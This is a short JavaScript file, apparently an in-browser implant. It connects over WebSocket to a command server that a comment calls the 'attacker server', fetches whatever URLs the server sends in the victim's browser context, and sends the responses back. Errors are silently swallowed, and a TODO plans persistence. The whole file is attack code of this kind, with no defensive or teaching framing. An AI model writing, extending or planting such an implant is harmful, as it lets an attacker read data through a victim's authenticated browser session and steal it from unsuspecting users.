(() => { // Don't pollute global namespace
    // TODO implement persistence

    (() => {
        // TODO build file using a config containing the attacker server
        const ws = new WebSocket('ws://localhost:8080/ws')

        ws.onmessage = (msg) => {
            const msgobj = JSON.parse(msg.data)
            const url = msgobj.url
            // TODO make a request object to allow for more configurable requests
            fetch(url)
                .then(res => {
                    res.text()
                        .then(restext => {
                            ws.send(JSON.stringify(restext))
                        })
                        .catch(err => null) // Silently error TODO send error back to server
                })
                .catch(err => null) // Silently error TODO send error back to server
        }
    })()
})()
